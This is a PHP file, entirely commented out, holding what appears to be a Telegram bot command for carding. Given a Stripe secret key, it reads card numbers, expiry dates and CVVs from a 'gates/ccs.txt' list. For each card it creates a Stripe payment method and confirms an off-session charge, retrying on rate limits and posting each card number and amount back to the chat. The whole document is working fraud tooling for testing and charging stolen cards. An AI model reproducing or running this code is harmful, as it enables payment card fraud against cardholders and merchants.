
<?php 
/*
if ((strpos($message, "/repair") === 0)||(strpos($message, "!repair") === 0)||(strpos($message, ".charge") === 0)){
  if ($role == "OWNER")
  {
$sk = substr($message,7);
    sendMessage($chatId,"HI",$messageId);
$msgsnd = reply_to($chatId,urlencode("
➜ 𝗦𝗞 : $sk
"),$messageId);
   $respon = json_decode($msgsnd, TRUE);
$message_id_1 = $respon['result']['message_id'];

 $ccss = explode("\n", file_get_contents('gates/ccs.txt'));
foreach ($ccss as $ccs)
  {
$amt = (amtran(1).".".amtran(3))*100;
$count ++;
$cc = $ccs[0];
$mes = $ccs[1];
$ano = $ccs[2];
$cvv = $ccs[3];
$lista = "$ccs[0]|$ccs[1]|$ccs[2]|$ccs[3]";
while(true)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  
$r1 = curl_exec($ch);  
if (strpos($r1, "rate_limit"))   
{  
    continue;  
}  
break;  
}  
//===========[𝙀𝙓𝙏𝙍𝘼𝘾𝙏𝙄𝙊𝙉]=========//
$tok = trim(strip_tags(getStr($r1, '"id": "', '"')));
$check1 = Getstr($r1,'"cvc_check": "','"');
$msg = Getstr($r1,'"decline_code": "','"');
$msg2 = Getstr($r1,'"message": "','"');
//==========[ #1 𝙍𝙚𝙦 𝘾𝙃𝙀𝘾𝙆𝙄𝙉𝙂]===//
  //=============[2nd REQ]=======//
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amt.'&currency=usd&payment_method_types[]=card&description='.$dnt.'&payment_method='.$tok.'&confirm=true&off_session=true');  
$r2 = curl_exec($ch);  
if (strpos($r2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}
    edit_message($chatId,urlencode("
➜ 𝗦𝗞 : $sk
➜ 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 : $count
➜ 𝐀𝐌𝐎𝐔𝐍𝐓 : $amt
➜ 𝗖𝗖 : $cc
    ",$message_id_1))
  }
}
  
}
*/
?>
